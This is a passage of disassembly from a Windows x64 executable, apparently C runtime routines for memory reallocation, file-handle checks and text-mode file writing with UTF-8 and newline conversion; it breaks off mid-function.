   14000a319:	33 d2                	xor    %edx,%edx
   14000a31b:	48 8b 0d 76 f4 00 00 	mov    0xf476(%rip),%rcx        # 0x140019798
   14000a322:	48 83 c4 28          	add    $0x28,%rsp
   14000a326:	48 ff 25 d3 3e 00 00 	rex.W jmp *0x3ed3(%rip)        # 0x14000e200
   14000a32d:	cc                   	int3
   14000a32e:	cc                   	int3
   14000a32f:	cc                   	int3
   14000a330:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a335:	57                   	push   %rdi
   14000a336:	48 83 ec 20          	sub    $0x20,%rsp
   14000a33a:	48 8b da             	mov    %rdx,%rbx
   14000a33d:	48 8b f9             	mov    %rcx,%rdi
   14000a340:	48 85 c9             	test   %rcx,%rcx
   14000a343:	75 0a                	jne    0x14000a34f
   14000a345:	48 8b ca             	mov    %rdx,%rcx
   14000a348:	e8 af df ff ff       	call   0x1400082fc
   14000a34d:	eb 1f                	jmp    0x14000a36e
   14000a34f:	48 85 db             	test   %rbx,%rbx
   14000a352:	75 07                	jne    0x14000a35b
   14000a354:	e8 d3 c2 ff ff       	call   0x14000662c
   14000a359:	eb 11                	jmp    0x14000a36c
   14000a35b:	48 83 fb e0          	cmp    $0xffffffffffffffe0,%rbx
   14000a35f:	76 2d                	jbe    0x14000a38e
   14000a361:	e8 2e c2 ff ff       	call   0x140006594
   14000a366:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000a36c:	33 c0                	xor    %eax,%eax
   14000a36e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a373:	48 83 c4 20          	add    $0x20,%rsp
   14000a377:	5f                   	pop    %rdi
   14000a378:	c3                   	ret
   14000a379:	e8 e2 ac ff ff       	call   0x140005060
   14000a37e:	85 c0                	test   %eax,%eax
   14000a380:	74 df                	je     0x14000a361
   14000a382:	48 8b cb             	mov    %rbx,%rcx
   14000a385:	e8 be eb ff ff       	call   0x140008f48
   14000a38a:	85 c0                	test   %eax,%eax
   14000a38c:	74 d3                	je     0x14000a361
   14000a38e:	48 8b 0d 03 f4 00 00 	mov    0xf403(%rip),%rcx        # 0x140019798
   14000a395:	4c 8b cb             	mov    %rbx,%r9
   14000a398:	4c 8b c7             	mov    %rdi,%r8
   14000a39b:	33 d2                	xor    %edx,%edx
   14000a39d:	ff 15 65 3e 00 00    	call   *0x3e65(%rip)        # 0x14000e208
   14000a3a3:	48 85 c0             	test   %rax,%rax
   14000a3a6:	74 d1                	je     0x14000a379
   14000a3a8:	eb c4                	jmp    0x14000a36e
   14000a3aa:	cc                   	int3
   14000a3ab:	cc                   	int3
   14000a3ac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a3b1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000a3b6:	57                   	push   %rdi
   14000a3b7:	48 83 ec 20          	sub    $0x20,%rsp
   14000a3bb:	49 8b f9             	mov    %r9,%rdi
   14000a3be:	49 8b d8             	mov    %r8,%rbx
   14000a3c1:	8b 0a                	mov    (%rdx),%ecx
   14000a3c3:	e8 6c d8 ff ff       	call   0x140007c34
   14000a3c8:	90                   	nop
   14000a3c9:	48 8b 03             	mov    (%rbx),%rax
   14000a3cc:	48 63 08             	movslq (%rax),%rcx
   14000a3cf:	48 8b d1             	mov    %rcx,%rdx
   14000a3d2:	48 8b c1             	mov    %rcx,%rax
   14000a3d5:	48 c1 f8 06          	sar    $0x6,%rax
   14000a3d9:	4c 8d 05 10 ee 00 00 	lea    0xee10(%rip),%r8        # 0x1400191f0
   14000a3e0:	83 e2 3f             	and    $0x3f,%edx
   14000a3e3:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000a3e7:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000a3eb:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   14000a3f0:	74 23                	je     0x14000a415
   14000a3f2:	e8 49 d9 ff ff       	call   0x140007d40
   14000a3f7:	48 8b c8             	mov    %rax,%rcx
   14000a3fa:	ff 15 10 3e 00 00    	call   *0x3e10(%rip)        # 0x14000e210
   14000a400:	33 db                	xor    %ebx,%ebx
   14000a402:	85 c0                	test   %eax,%eax
   14000a404:	75 1d                	jne    0x14000a423
   14000a406:	ff 15 84 3c 00 00    	call   *0x3c84(%rip)        # 0x14000e090
   14000a40c:	8b d8                	mov    %eax,%ebx
   14000a40e:	e8 61 c1 ff ff       	call   0x140006574
   14000a413:	89 18                	mov    %ebx,(%rax)
   14000a415:	e8 7a c1 ff ff       	call   0x140006594
   14000a41a:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a420:	83 cb ff             	or     $0xffffffff,%ebx
   14000a423:	8b 0f                	mov    (%rdi),%ecx
   14000a425:	e8 32 d8 ff ff       	call   0x140007c5c
   14000a42a:	8b c3                	mov    %ebx,%eax
   14000a42c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a431:	48 83 c4 20          	add    $0x20,%rsp
   14000a435:	5f                   	pop    %rdi
   14000a436:	c3                   	ret
   14000a437:	cc                   	int3
   14000a438:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000a43c:	48 83 ec 38          	sub    $0x38,%rsp
   14000a440:	48 63 d1             	movslq %ecx,%rdx
   14000a443:	83 fa fe             	cmp    $0xfffffffe,%edx
   14000a446:	75 0d                	jne    0x14000a455
   14000a448:	e8 47 c1 ff ff       	call   0x140006594
   14000a44d:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a453:	eb 6c                	jmp    0x14000a4c1
   14000a455:	85 c9                	test   %ecx,%ecx
   14000a457:	78 58                	js     0x14000a4b1
   14000a459:	3b 15 91 f1 00 00    	cmp    0xf191(%rip),%edx        # 0x1400195f0
   14000a45f:	73 50                	jae    0x14000a4b1
   14000a461:	48 8b ca             	mov    %rdx,%rcx
   14000a464:	4c 8d 05 85 ed 00 00 	lea    0xed85(%rip),%r8        # 0x1400191f0
   14000a46b:	83 e1 3f             	and    $0x3f,%ecx
   14000a46e:	48 8b c2             	mov    %rdx,%rax
   14000a471:	48 c1 f8 06          	sar    $0x6,%rax
   14000a475:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000a479:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000a47d:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   14000a482:	74 2d                	je     0x14000a4b1
   14000a484:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000a489:	89 54 24 50          	mov    %edx,0x50(%rsp)
   14000a48d:	89 54 24 58          	mov    %edx,0x58(%rsp)
   14000a491:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000a496:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   14000a49b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000a4a0:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000a4a5:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000a4aa:	e8 fd fe ff ff       	call   0x14000a3ac
   14000a4af:	eb 13                	jmp    0x14000a4c4
   14000a4b1:	e8 de c0 ff ff       	call   0x140006594
   14000a4b6:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a4bc:	e8 7b be ff ff       	call   0x14000633c
   14000a4c1:	83 c8 ff             	or     $0xffffffff,%eax
   14000a4c4:	48 83 c4 38          	add    $0x38,%rsp
   14000a4c8:	c3                   	ret
   14000a4c9:	cc                   	int3
   14000a4ca:	cc                   	int3
   14000a4cb:	cc                   	int3
   14000a4cc:	48 8b c4             	mov    %rsp,%rax
   14000a4cf:	55                   	push   %rbp
   14000a4d0:	56                   	push   %rsi
   14000a4d1:	57                   	push   %rdi
   14000a4d2:	41 54                	push   %r12
   14000a4d4:	41 55                	push   %r13
   14000a4d6:	41 56                	push   %r14
   14000a4d8:	41 57                	push   %r15
   14000a4da:	48 8d 68 a9          	lea    -0x57(%rax),%rbp
   14000a4de:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   14000a4e5:	48 c7 45 f7 fe ff ff 	movq   $0xfffffffffffffffe,-0x9(%rbp)
   14000a4ec:	ff 
   14000a4ed:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000a4f1:	48 8b 05 48 db 00 00 	mov    0xdb48(%rip),%rax        # 0x140018040
   14000a4f8:	48 33 c4             	xor    %rsp,%rax
   14000a4fb:	48 89 45 17          	mov    %rax,0x17(%rbp)
   14000a4ff:	49 8b f0             	mov    %r8,%rsi
   14000a502:	4c 89 45 b7          	mov    %r8,-0x49(%rbp)
   14000a506:	4c 63 f2             	movslq %edx,%r14
   14000a509:	48 8b d9             	mov    %rcx,%rbx
   14000a50c:	4c 8b 6d 7f          	mov    0x7f(%rbp),%r13
   14000a510:	4c 89 6d af          	mov    %r13,-0x51(%rbp)
   14000a514:	49 8b ce             	mov    %r14,%rcx
   14000a517:	48 89 4d e7          	mov    %rcx,-0x19(%rbp)
   14000a51b:	49 8b c6             	mov    %r14,%rax
   14000a51e:	48 c1 f8 06          	sar    $0x6,%rax
   14000a522:	48 89 45 a7          	mov    %rax,-0x59(%rbp)
   14000a526:	48 8d 15 d3 5a ff ff 	lea    -0xa52d(%rip),%rdx        # 0x140000000
   14000a52d:	83 e1 3f             	and    $0x3f,%ecx
   14000a530:	48 89 4d ef          	mov    %rcx,-0x11(%rbp)
   14000a534:	4c 8d 3c c9          	lea    (%rcx,%rcx,8),%r15
   14000a538:	48 8b 84 c2 f0 91 01 	mov    0x191f0(%rdx,%rax,8),%rax
   14000a53f:	00 
   14000a540:	4a 8b 44 f8 28       	mov    0x28(%rax,%r15,8),%rax
   14000a545:	48 89 45 d7          	mov    %rax,-0x29(%rbp)
   14000a549:	45 8b e1             	mov    %r9d,%r12d
   14000a54c:	4d 03 e0             	add    %r8,%r12
   14000a54f:	4c 89 65 8f          	mov    %r12,-0x71(%rbp)
   14000a553:	ff 15 bf 3c 00 00    	call   *0x3cbf(%rip)        # 0x14000e218
   14000a559:	89 45 9f             	mov    %eax,-0x61(%rbp)
   14000a55c:	33 ff                	xor    %edi,%edi
   14000a55e:	41 38 7d 28          	cmp    %dil,0x28(%r13)
   14000a562:	75 08                	jne    0x14000a56c
   14000a564:	49 8b cd             	mov    %r13,%rcx
   14000a567:	e8 34 b2 ff ff       	call   0x1400057a0
   14000a56c:	49 8b 4d 18          	mov    0x18(%r13),%rcx
   14000a570:	44 8b 41 0c          	mov    0xc(%rcx),%r8d
   14000a574:	44 89 45 a3          	mov    %r8d,-0x5d(%rbp)
   14000a578:	33 c0                	xor    %eax,%eax
   14000a57a:	48 89 03             	mov    %rax,(%rbx)
   14000a57d:	89 43 08             	mov    %eax,0x8(%rbx)
   14000a580:	4c 39 65 b7          	cmp    %r12,-0x49(%rbp)
   14000a584:	0f 83 a2 03 00 00    	jae    0x14000a92c
   14000a58a:	49 8b c6             	mov    %r14,%rax
   14000a58d:	48 c1 f8 06          	sar    $0x6,%rax
   14000a591:	48 89 45 df          	mov    %rax,-0x21(%rbp)
   14000a595:	8b d7                	mov    %edi,%edx
   14000a597:	8a 0e                	mov    (%rsi),%cl
   14000a599:	88 4c 24 40          	mov    %cl,0x40(%rsp)
   14000a59d:	89 7d 83             	mov    %edi,-0x7d(%rbp)
   14000a5a0:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   14000a5a6:	4c 8d 1d 53 5a ff ff 	lea    -0xa5ad(%rip),%r11        # 0x140000000
   14000a5ad:	41 81 f8 e9 fd 00 00 	cmp    $0xfde9,%r8d
   14000a5b4:	0f 85 7a 01 00 00    	jne    0x14000a734
   14000a5ba:	8b d7                	mov    %edi,%edx
   14000a5bc:	4c 8b f7             	mov    %rdi,%r14
   14000a5bf:	49 8b 84 c3 f0 91 01 	mov    0x191f0(%r11,%rax,8),%rax
   14000a5c6:	00 
   14000a5c7:	4e 8d 0c fd 3e 00 00 	lea    0x3e(,%r15,8),%r9
   14000a5ce:	00 
   14000a5cf:	4c 03 c8             	add    %rax,%r9
   14000a5d2:	49 8b c1             	mov    %r9,%rax
   14000a5d5:	40 38 38             	cmp    %dil,(%rax)
   14000a5d8:	74 0e                	je     0x14000a5e8
   14000a5da:	ff c2                	inc    %edx
   14000a5dc:	49 ff c6             	inc    %r14
   14000a5df:	48 ff c0             	inc    %rax
   14000a5e2:	49 83 fe 05          	cmp    $0x5,%r14
   14000a5e6:	7c ed                	jl     0x14000a5d5
   14000a5e8:	4d 85 f6             	test   %r14,%r14
   14000a5eb:	0f 84 d5 00 00 00    	je     0x14000a6c6
   14000a5f1:	4c 8b 55 a7          	mov    -0x59(%rbp),%r10
   14000a5f5:	4b 8b 84 d3 f0 91 01 	mov    0x191f0(%r11,%r10,8),%rax
   14000a5fc:	00 
   14000a5fd:	42 0f b6 4c f8 3e    	movzbl 0x3e(%rax,%r15,8),%ecx
   14000a603:	46 0f be a4 19 30 89 	movsbl 0x18930(%rcx,%r11,1),%r12d
   14000a60a:	01 00 
   14000a60c:	41 ff c4             	inc    %r12d
   14000a60f:	41 8b c4             	mov    %r12d,%eax
   14000a612:	2b c2                	sub    %edx,%eax
   14000a614:	89 45 97             	mov    %eax,-0x69(%rbp)
   14000a617:	48 8b 55 8f          	mov    -0x71(%rbp),%rdx
   14000a61b:	48 2b d6             	sub    %rsi,%rdx
   14000a61e:	4c 63 c0             	movslq %eax,%r8
   14000a621:	4c 3b c2             	cmp    %rdx,%r8
   14000a624:	0f 8f 71 02 00 00    	jg     0x14000a89b
   14000a62a:	48 8b cf             	mov    %rdi,%rcx
   14000a62d:	41 8a 01             	mov    (%r9),%al
   14000a630:	88 44 0d ff          	mov    %al,-0x1(%rbp,%rcx,1)
   14000a634:	48 ff c1             	inc    %rcx
   14000a637:	49 ff c1             	inc    %r9
   14000a63a:	49 3b ce             	cmp    %r14,%rcx
   14000a63d:	7c ee                	jl     0x14000a62d
   14000a63f:	4d 85 c0             	test   %r8,%r8
   14000a642:	7e 1a                	jle    0x14000a65e
   14000a644:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   14000a648:	49 03 ce             	add    %r14,%rcx
   14000a64b:	48 8b d6             	mov    %rsi,%rdx
   14000a64e:	e8 9d 2c 00 00       	call   0x14000d2f0
   14000a653:	4c 8b 55 a7          	mov    -0x59(%rbp),%r10
   14000a657:	4c 8d 1d a2 59 ff ff 	lea    -0xa65e(%rip),%r11        # 0x140000000
   14000a65e:	48 8b d7             	mov    %rdi,%rdx
   14000a661:	4b 8b 8c d3 f0 91 01 	mov    0x191f0(%r11,%r10,8),%rcx
   14000a668:	00 
   14000a669:	48 03 ca             	add    %rdx,%rcx
   14000a66c:	42 88 7c f9 3e       	mov    %dil,0x3e(%rcx,%r15,8)
   14000a671:	48 ff c2             	inc    %rdx
   14000a674:	49 3b d6             	cmp    %r14,%rdx
   14000a677:	7c e8                	jl     0x14000a661
   14000a679:	48 89 7d bf          	mov    %rdi,-0x41(%rbp)
   14000a67d:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
   14000a681:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   14000a685:	8b c7                	mov    %edi,%eax
   14000a687:	41 83 fc 04          	cmp    $0x4,%r12d
   14000a68b:	0f 94 c0             	sete   %al
   14000a68e:	ff c0                	inc    %eax
   14000a690:	44 8b e0             	mov    %eax,%r12d
   14000a693:	44 8b c0             	mov    %eax,%r8d
   14000a696:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   14000a69b:	4c 8d 4d bf          	lea    -0x41(%rbp),%r9
   14000a69f:	48 8d 55 c7          	lea    -0x39(%rbp),%rdx
   14000a6a3:	48 8d 4d 83          	lea    -0x7d(%rbp),%rcx
   14000a6a7:	e8 0c 0c 00 00       	call   0x14000b2b8
   14000a6ac:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000a6b0:	0f 84 76 02 00 00    	je     0x14000a92c
   14000a6b6:	8b 45 97             	mov    -0x69(%rbp),%eax
   14000a6b9:	ff c8                	dec    %eax
   14000a6bb:	48 63 c8             	movslq %eax,%rcx
   14000a6be:	48 03 f1             	add    %rcx,%rsi
   14000a6c1:	e9 03 01 00 00       	jmp    0x14000a7c9
   14000a6c6:	0f b6 06             	movzbl (%rsi),%eax
   14000a6c9:	4e 0f be ac 18 30 89 	movsbq 0x18930(%rax,%r11,1),%r13
   14000a6d0:	01 00 
   14000a6d2:	41 8d 4d 01          	lea    0x1(%r13),%ecx
   14000a6d6:	4c 8b 45 8f          	mov    -0x71(%rbp),%r8
   14000a6da:	4c 2b c6             	sub    %rsi,%r8
   14000a6dd:	48 63 c1             	movslq %ecx,%rax
   14000a6e0:	49 3b c0             	cmp    %r8,%rax
   14000a6e3:	0f 8f e0 01 00 00    	jg     0x14000a8c9
   14000a6e9:	48 89 7d 97          	mov    %rdi,-0x69(%rbp)
   14000a6ed:	48 89 75 cf          	mov    %rsi,-0x31(%rbp)
   14000a6f1:	8b c7                	mov    %edi,%eax
   14000a6f3:	83 f9 04             	cmp    $0x4,%ecx
   14000a6f6:	0f 94 c0             	sete   %al
   14000a6f9:	ff c0                	inc    %eax
   14000a6fb:	44 8b f0             	mov    %eax,%r14d
   14000a6fe:	44 8b c0             	mov    %eax,%r8d
   14000a701:	48 8b 45 af          	mov    -0x51(%rbp),%rax
   14000a705:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000a70a:	4c 8d 4d 97          	lea    -0x69(%rbp),%r9
   14000a70e:	48 8d 55 cf          	lea    -0x31(%rbp),%rdx
   14000a712:	48 8d 4d 83          	lea    -0x7d(%rbp),%rcx
   14000a716:	e8 9d 0b 00 00       	call   0x14000b2b8
   14000a71b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000a71f:	0f 84 07 02 00 00    	je     0x14000a92c
   14000a725:	49 03 f5             	add    %r13,%rsi
   14000a728:	45 8b e6             	mov    %r14d,%r12d
   14000a72b:	4c 8b 6d af          	mov    -0x51(%rbp),%r13
   14000a72f:	e9 95 00 00 00       	jmp    0x14000a7c9
   14000a734:	4c 8b 55 a7          	mov    -0x59(%rbp),%r10
   14000a738:	4f 8b 8c d3 f0 91 01 	mov    0x191f0(%r11,%r10,8),%r9
   14000a73f:	00 
   14000a740:	43 8a 4c f9 3d       	mov    0x3d(%r9,%r15,8),%cl
   14000a745:	f6 c1 04             	test   $0x4,%cl
   14000a748:	74 21                	je     0x14000a76b
   14000a74a:	43 8a 44 f9 3e       	mov    0x3e(%r9,%r15,8),%al
   14000a74f:	88 45 07             	mov    %al,0x7(%rbp)
   14000a752:	8a 06                	mov    (%rsi),%al
   14000a754:	88 45 08             	mov    %al,0x8(%rbp)
   14000a757:	80 e1 fb             	and    $0xfb,%cl
   14000a75a:	43 88 4c f9 3d       	mov    %cl,0x3d(%r9,%r15,8)
   14000a75f:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000a765:	48 8d 55 07          	lea    0x7(%rbp),%rdx
   14000a769:	eb 49                	jmp    0x14000a7b4
   14000a76b:	44 0f b6 06          	movzbl (%rsi),%r8d
   14000a76f:	49 8b 45 18          	mov    0x18(%r13),%rax
   14000a773:	48 8b 08             	mov    (%rax),%rcx
   14000a776:	66 42 39 3c 41       	cmp    %di,(%rcx,%r8,2)
   14000a77b:	7d 31                	jge    0x14000a7ae
   14000a77d:	4c 8d 76 01          	lea    0x1(%rsi),%r14
   14000a781:	4c 3b 75 8f          	cmp    -0x71(%rbp),%r14
   14000a785:	0f 83 7c 01 00 00    	jae    0x14000a907
   14000a78b:	4d 8b cd             	mov    %r13,%r9
   14000a78e:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000a794:	48 8b d6             	mov    %rsi,%rdx
   14000a797:	48 8d 4d 83          	lea    -0x7d(%rbp),%rcx
   14000a79b:	e8 e0 f0 ff ff       	call   0x140009880
   14000a7a0:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000a7a3:	0f 84 83 01 00 00    	je     0x14000a92c
   14000a7a9:	49 8b f6             	mov    %r14,%rsi
   14000a7ac:	eb 1b                	jmp    0x14000a7c9
   14000a7ae:	4d 8b c4             	mov    %r12,%r8
   14000a7b1:	48 8b d6             	mov    %rsi,%rdx
   14000a7b4:	4d 8b cd             	mov    %r13,%r9
   14000a7b7:	48 8d 4d 83          	lea    -0x7d(%rbp),%rcx
   14000a7bb:	e8 c0 f0 ff ff       	call   0x140009880
   14000a7c0:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000a7c3:	0f 84 63 01 00 00    	je     0x14000a92c
   14000a7c9:	48 ff c6             	inc    %rsi
   14000a7cc:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   14000a7d1:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   14000a7d6:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   14000a7dd:	00 
   14000a7de:	48 8d 45 0f          	lea    0xf(%rbp),%rax
   14000a7e2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000a7e7:	45 8b cc             	mov    %r12d,%r9d
   14000a7ea:	4c 8d 45 83          	lea    -0x7d(%rbp),%r8
   14000a7ee:	33 d2                	xor    %edx,%edx
   14000a7f0:	8b 4d 9f             	mov    -0x61(%rbp),%ecx
   14000a7f3:	e8 5c d0 ff ff       	call   0x140007854
   14000a7f8:	44 8b f0             	mov    %eax,%r14d
   14000a7fb:	85 c0                	test   %eax,%eax
   14000a7fd:	0f 84 29 01 00 00    	je     0x14000a92c
   14000a803:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000a808:	4c 8d 4d 87          	lea    -0x79(%rbp),%r9
   14000a80c:	44 8b c0             	mov    %eax,%r8d
   14000a80f:	48 8d 55 0f          	lea    0xf(%rbp),%rdx
   14000a813:	4c 8b 65 d7          	mov    -0x29(%rbp),%r12
   14000a817:	49 8b cc             	mov    %r12,%rcx
   14000a81a:	ff 15 f8 38 00 00    	call   *0x38f8(%rip)        # 0x14000e118
   14000a820:	85 c0                	test   %eax,%eax
   14000a822:	0f 84 fc 00 00 00    	je     0x14000a924
   14000a828:	8b d6                	mov    %esi,%edx
   14000a82a:	2b 55 b7             	sub    -0x49(%rbp),%edx
   14000a82d:	03 53 08             	add    0x8(%rbx),%edx
   14000a830:	89 53 04             	mov    %edx,0x4(%rbx)
   14000a833:	44 39 75 87          	cmp    %r14d,-0x79(%rbp)
   14000a837:	0f 82 ef 00 00 00    	jb     0x14000a92c
   14000a83d:	80 7c 24 40 0a       	cmpb   $0xa,0x40(%rsp)
   14000a842:	75 40                	jne    0x14000a884
   14000a844:	b8 0d 00 00 00       	mov    $0xd,%eax
   14000a849:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   14000a84e:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000a853:	4c 8d 4d 87          	lea    -0x79(%rbp),%r9
   14000a857:	44 8d 40 f4          	lea    -0xc(%rax),%r8d
   14000a85b:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000a860:	49 8b cc             	mov    %r12,%rcx
   14000a863:	ff 15 af 38 00 00    	call   *0x38af(%rip)        # 0x14000e118
   14000a869:	85 c0                	test   %eax,%eax
   14000a86b:	0f 84 b3 00 00 00    	je     0x14000a924
   14000a871:	83 7d 87 01          	cmpl   $0x1,-0x79(%rbp)
   14000a875:	0f 82 b1 00 00 00    	jb     0x14000a92c
   14000a87b:	ff 43 08             	incl   0x8(%rbx)
   14000a87e:	ff 43 04             	incl   0x4(%rbx)
   14000a881:	8b 53 04             	mov    0x4(%rbx),%edx
   14000a884:	48 3b 75 8f          	cmp    -0x71(%rbp),%rsi
   14000a888:	0f 83 9e 00 00 00    	jae    0x14000a92c
   14000a88e:	48 8b 45 df          	mov    -0x21(%rbp),%rax
   14000a892:	44 8b 45 a3          	mov    -0x5d(%rbp),%r8d
   14000a896:	e9 fc fc ff ff       	jmp    0x14000a597
   14000a89b:	48 85 d2             	test   %rdx,%rdx
   14000a89e:	7e 24                	jle    0x14000a8c4
   14000a8a0:	49 2b f6             	sub    %r14,%rsi
   14000a8a3:	4b 8b 8c d3 f0 91 01 	mov    0x191f0(%r11,%r10,8),%rcx
   14000a8aa:	00 
   14000a8ab:	49 03 ce             	add    %r14,%rcx
   14000a8ae:	42 8a 04 36          	mov    (%rsi,%r14,1),%al
   14000a8b2:	42 88 44 f9 3e       	mov    %al,0x3e(%rcx,%r15,8)
   14000a8b7:	ff c7                	inc    %edi
   14000a8b9:	49 ff c6             	inc    %r14
   14000a8bc:	48 63 c7             	movslq %edi,%rax
   14000a8bf:	48 3b c2             	cmp    %rdx,%rax
   14000a8c2:	7c df                	jl     0x14000a8a3
   14000a8c4:	01 53 04             	add    %edx,0x4(%rbx)
   14000a8c7:	eb 63                	jmp    0x14000a92c
   14000a8c9:	4d 85 c0             	test   %r8,%r8
   14000a8cc:	7e 33                	jle    0x14000a901
   14000a8ce:	48 8b d7             	mov    %rdi,%rdx
   14000a8d1:	4c 8b 55 e7          	mov    -0x19(%rbp),%r10
   14000a8d5:	49 c1 fa 06          	sar    $0x6,%r10
   14000a8d9:	48 8b 45 ef          	mov    -0x11(%rbp),%rax
   14000a8dd:	4c 8d 0c c0          	lea    (%rax,%rax,8),%r9
   14000a8e1:	4b 8b 84 d3 f0 91 01 	mov    0x191f0(%r11,%r10,8),%rax
   14000a8e8:	00 
   14000a8e9:	4a 8d 0c c8          	lea    (%rax,%r9,8),%rcx
   14000a8ed:	8a 04 32             	mov    (%rdx,%rsi,1),%al
   14000a8f0:	88 44 11 3e          	mov    %al,0x3e(%rcx,%rdx,1)
   14000a8f4:	ff c7                	inc    %edi
   14000a8f6:	48 ff c2             	inc    %rdx
   14000a8f9:	48 63 c7             	movslq %edi,%rax
   14000a8fc:	49 3b c0             	cmp    %r8,%rax
   14000a8ff:	7c e0                	jl     0x14000a8e1
   14000a901:	44 01 43 04          	add    %r8d,0x4(%rbx)
   14000a905:	eb 25                	jmp    0x14000a92c
   14000a907:	8a 06                	mov    (%rsi),%al
   14000a909:	43 88 44 f9 3e       	mov    %al,0x3e(%r9,%r15,8)
   14000a90e:	4b 8b 84 d3 f0 91 01 	mov    0x191f0(%r11,%r10,8),%rax
   14000a915:	00 
   14000a916:	42 80 4c f8 3d 04    	orb    $0x4,0x3d(%rax,%r15,8)
   14000a91c:	8d 42 01             	lea    0x1(%rdx),%eax
   14000a91f:	89 43 04             	mov    %eax,0x4(%rbx)
   14000a922:	eb 08                	jmp    0x14000a92c
   14000a924:	ff 15 66 37 00 00    	call   *0x3766(%rip)        # 0x14000e090
   14000a92a:	89 03                	mov    %eax,(%rbx)
   14000a92c:	48 8b c3             	mov    %rbx,%rax
   14000a92f:	48 8b 4d 17          	mov    0x17(%rbp),%rcx
   14000a933:	48 33 cc             	xor    %rsp,%rcx
   14000a936:	e8 95 22 00 00       	call   0x14000cbd0
   14000a93b:	48 8b 9c 24 20 01 00 	mov    0x120(%rsp),%rbx
   14000a942:	00 
   14000a943:	48 81 c4 e0 00 00 00 	add    $0xe0,%rsp
   14000a94a:	41 5f                	pop    %r15
   14000a94c:	41 5e                	pop    %r14
   14000a94e:	41 5d                	pop    %r13
   14000a950:	41 5c                	pop    %r12
   14000a952:	5f                   	pop    %rdi
   14000a953:	5e                   	pop    %rsi
   14000a954:	5d                   	pop    %rbp
   14000a955:	c3                   	ret
   14000a956:	cc                   	int3
   14000a957:	cc                   	int3
   14000a958:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a95d:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000a962:	56                   	push   %rsi
   14000a963:	57                   	push   %rdi
   14000a964:	41 56                	push   %r14
   14000a966:	b8 50 14 00 00       	mov    $0x1450,%eax
   14000a96b:	e8 20 24 00 00       	call   0x14000cd90
   14000a970:	48 2b e0             	sub    %rax,%rsp
   14000a973:	48 8b 05 c6 d6 00 00 	mov    0xd6c6(%rip),%rax        # 0x140018040
   14000a97a:	48 33 c4             	xor    %rsp,%rax
   14000a97d:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   14000a984:	00 
   14000a985:	4c 63 d2             	movslq %edx,%r10
   14000a988:	48 8b f9             	mov    %rcx,%rdi
   14000a98b:	49 8b c2             	mov    %r10,%rax
   14000a98e:	41 8b e9             	mov    %r9d,%ebp
   14000a991:	48 c1 f8 06          	sar    $0x6,%rax
   14000a995:	48 8d 0d 54 e8 00 00 	lea    0xe854(%rip),%rcx        # 0x1400191f0
   14000a99c:	41 83 e2 3f          	and    $0x3f,%r10d
   14000a9a0:	49 03 e8             	add    %r8,%rbp
   14000a9a3:	49 8b f0             	mov    %r8,%rsi
   14000a9a6:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000a9aa:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000a9ae:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   14000a9b3:	33 c0                	xor    %eax,%eax
   14000a9b5:	48 89 07             	mov    %rax,(%rdi)
   14000a9b8:	89 47 08             	mov    %eax,0x8(%rdi)
   14000a9bb:	4c 3b c5             	cmp    %rbp,%r8
   14000a9be:	73 6f                	jae    0x14000aa2f
   14000a9c0:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   14000a9c5:	48 3b f5             	cmp    %rbp,%rsi
   14000a9c8:	73 24                	jae    0x14000a9ee
   14000a9ca:	8a 06                	mov    (%rsi),%al
   14000a9cc:	48 ff c6             	inc    %rsi
   14000a9cf:	3c 0a                	cmp    $0xa,%al
   14000a9d1:	75 09                	jne    0x14000a9dc
   14000a9d3:	ff 47 08             	incl   0x8(%rdi)
